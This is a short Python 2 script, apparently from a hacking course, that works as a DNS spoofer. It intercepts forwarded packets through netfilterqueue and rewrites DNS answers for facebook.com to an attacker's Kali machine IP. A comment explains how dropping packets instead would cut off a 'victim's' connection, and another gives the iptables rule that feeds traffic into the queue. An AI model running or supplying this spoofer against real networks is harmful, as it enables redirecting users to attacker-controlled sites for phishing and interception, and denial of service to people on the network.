#built with python 2
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #converting our packet into scapy packet so that we can use filtering functions and layers of scapy
    if scapy_packet.haslayer(scapy.DNSRR):  # DNSRR means dns response DNSQR means dns request
    # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        website = "facebook.com"
        if website in qname:
            print("[+]Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.105") #rdata = ip of kali
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet))
    packet.accept()
    #packet.drop() #to fdrop the packet, in this way we can cut the internet connection of the victim

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #binding (bind(0)) queue with linux machine queue iptables -I FORWARD -j NFQUEUE --queue-num 0
queue.run()
